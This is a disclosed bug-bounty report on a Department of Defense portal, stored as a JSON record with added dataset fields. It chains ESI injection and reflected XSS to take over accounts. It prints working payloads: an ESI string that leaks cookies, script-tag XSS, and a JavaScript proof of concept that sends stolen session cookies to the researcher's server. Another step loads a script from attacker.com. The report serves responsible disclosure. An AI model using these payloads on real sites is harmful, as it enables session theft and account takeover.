{
  "reported_to": "U.S. Dept Of Defense",
  "reported_by": "jr0ch17 ",
  "title": "[hta3] Chain of ESI Injection & Reflected XSS leading to Account Takeover on [\u2588\u2588\u2588]",
  "content": "\nHi,\nSummary\nThere is an ESI injection vulnerability in the https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/portal/page/portal/TOPLEVELSITE/SearchResults/PerspectiveResults endpoint on the ms parameter. With this injection, we're able to extract session cookies that have the HttpOnly flag by using this payload.\nCode 43 Bytes\n1<esi:vars>$(HTTP_HEADER{Cookie})</esi:vars>\nWe also found a Reflected XSS vulnerability in the https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/portal/pls/portal/PORTAL.wwexp_render.show_tree endpoint on the title parameter\nBy chaining these 2 bugs together, we're able to steal session cookies and take over a victim user's account.\n\u00a0\nSteps To Reproduce\n1- By browsing here https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/portal/page/portal/TOPLEVELSITE/SearchResults/PerspectiveResults?osf=&ms=lol<esi:vars>$(HTTP_HEADER{Cookie})</esi:vars>lol&mo=containsall&pg=&sepg=-1&fi=&fs=&ft=&pu=1&has=&as=17%2C0%3B48%2C0&saa=ALL&po=matchall&pi=&pc=&co=equal&ci=&p_action=SUBMIT&ll=, we're able to see your cookies in the Search field between the lol strings at the beginning and end.\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n2- When browsing here, https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/portal/pls/portal/PORTAL.wwexp_render.show_tree?p_otype=SITEMAP&p_request=open&p_minusimage=&p_plusimage=&p_headerimage=%2Fimages%2Fbhfind2.gif&p_show_banner=NO&p_show_cancel=NO&p_open_item=1.FOLDER.FOLDERMAP.1_0&p_open_items=0.SITEMAP.FOLDERMAP.0_-1&p_domain=wwc&p_sub_domain=FOLDERMAP&p_title=Browse+Pages</title><svg/onload=alert(domain)>&p_datasource_data=document.SEARCH60_PAGESEARCH_362193163.ft&p_datasource_data=document.SEARCH60_PAGESEARCH_362193163.fi&p_datasource_data=document.SEARCH60_PAGESEARCH_362193163.fs&p_datasource_data=nls_sub_domain%3Dtext%2Cnls_name%3Dfolderplpopup, we can see an alert box showing the vulnerable domain caused by this HTML and JavaScript code in the title parameter.\nCode 34 Bytes\n1</title><svg/onload=alert(domain)>\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n3- To chain these 2 bugs together, we created the following PoC. This JavaScript code is fetching the URL containing the ESI injection, grabbing the value of the cookies in the response and then sending them over to our server in order to steal them.\nCode 702 Bytes\n1fetch('https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/portal/page/portal/TOPLEVELSITE/SearchResults/PerspectiveResults?osf=&ms=lol<esi:vars>$(HTTP_HEADER{Cookie})</esi:vars>lol&mo=containsall&pg=&sepg=-1&fi=&fs=&ft=&pu=1&has=&as=17%2C0%3B48%2C0&saa=ALL&po=matchall&pi=&pc=&co=equal&ci=&p_action=SUBMIT&ll=').then(function (response) {\n2\t\treturn response.text();\n3}).then(function (html) {\n4\n5\tvar parser = new DOMParser();\n6\tvar doc = parser.parseFromString(html, 'text/html');\n7  \n8  //var input = doc.querySelector('input')[0];\n9  var cookies = doc.getElementById(\"x61_ms\").value;\n10  fetch(`https://www.jr0ch17.com/ato?cookies=${cookies}`);\n11\n12}).catch(function (err) {\n13\t// There was an error\n14\tconsole.warn('Something went wrong.', err);\n15});\nTo trigger this whole PoC, you can browse to this URL. You can replace the server with your own to reproduce it.\nCode 634 Bytes\n1https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/portal/pls/portal/PORTAL.wwexp_render.show_tree?p_otype=SITEMAP&p_request=open&p_minusimage=&p_plusimage=&p_headerimage=%2Fimages%2Fbhfind2.gif&p_show_banner=NO&p_show_cancel=NO&p_open_item=1.FOLDER.FOLDERMAP.1_0&p_open_items=0.SITEMAP.FOLDERMAP.0_-1&p_domain=wwc&p_sub_domain=FOLDERMAP&p_title=Browse+Pages</title><script/src='https://www.jr0ch17.com/hta3.js'></script>&p_datasource_data=document.SEARCH60_PAGESEARCH_362193163.ft&p_datasource_data=document.SEARCH60_PAGESEARCH_362193163.fi&p_datasource_data=document.SEARCH60_PAGESEARCH_362193163.fs&p_datasource_data=nls_sub_domain%3Dtext%2Cnls_name%3Dfolderplpopup\nAs you can see, the XSS payload is now the following.\nCode 54 Bytes\n1</title><script/src='https://www.jr0ch17.com/hta3.js'>\nWe can then see that we have received the victim's cookies including the session cookie which has the HttpOnly flag.\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u00a0\nImpact\nBy chaining these 2 vulnerabilities together and by tricking a victim user into clicking a link, an attacker is able to steal their session cookies which have the HttpOnly flag and take over their account. With an ESI injection and depending on the configuration, it's also potentially possible to get an SSRF and get access to internal resources. We're still exploring that area of the bug at the moment so we'll provide updates on if we're able to get further with it.\nLet me know if you have any questions or require more details.\nThanks,\n@jr0ch17\n\n",
  "severity": [
    8.2,
    null
  ],
  "bounty": null,
  "weaknesses": [
    "Cross-site Scripting (XSS) - Reflected"
  ],
  "screenshots": {},
  "disclosed_date": 1665769440,
  "report_url": "https://hackerone.com/reports/1073780",
  "vuln_category": "WEB_APP",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "MEDIUM",
  "steps": [
    [
      1,
      "Inject ESI payload into the 'ms' parameter of the SearchResults endpoint to extract HTTP-only cookies: `https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/portal/page/portal/TOPLEVELSITE/SearchResults/PerspectiveResults?ms=lol<esi:vars>$(HTTP_HEADER{Cookie})</esi:vars>lol`"
    ],
    [
      2,
      "Exploit Reflected XSS in the 'title' parameter of the show_tree endpoint to execute malicious JavaScript: `https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/portal/pls/portal/PORTAL.wwexp_render.show_tree?p_title=Browse+Pages</title><script/src='https://attacker.com/steal.js'>`"
    ],
    [
      3,
      "Chain both vulnerabilities by using the XSS to fetch the ESI-injected cookie data and exfiltrate it to an attacker-controlled server."
    ]
  ],
  "vuln_description": "A chain of ESI Injection and Reflected XSS vulnerabilities allows stealing HTTP-only session cookies, leading to account takeover. The ESI injection leaks sensitive cookies, while the XSS delivers a payload to exfiltrate them.",
  "reason": "This attack requires: (1) identifying two distinct vulnerabilities (ESI injection and XSS), (2) understanding their interaction (cookie extraction via ESI + exfiltration via XSS), and (3) crafting a multi-stage payload. While ESI injection is somewhat specialized, the chaining logic follows common web attack patterns.",
  "new_complexity": "MEDIUM",
  "requires_code": false,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "injection_metadata": {
    "is_simple_payload": false
  },
  "authnz_metadata": {
    "reason": "The vulnerability involves chaining ESI Injection and Reflected XSS within the same application to steal session cookies, which falls under the scope of the methodology for detecting AuthN/AuthZ bypasses and IDORs. The methodology involves testing actions with different user sessions and resource IDs, which would include testing for XSS and cookie theft scenarios.",
    "is_detectable": true
  }
}